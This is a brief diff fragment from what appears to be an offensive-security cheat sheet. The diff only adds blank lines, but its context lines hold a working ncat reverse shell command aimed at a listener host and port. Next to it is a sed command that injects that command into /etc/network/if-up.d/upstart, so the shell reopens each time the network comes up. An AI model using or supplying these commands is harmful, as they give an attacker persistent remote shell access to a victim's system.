@@ -17,3 +17,5 @@ updated_at: '2023-04-10T20:34:19.947536+00:00'
 RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
 sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart
 ```
+
+
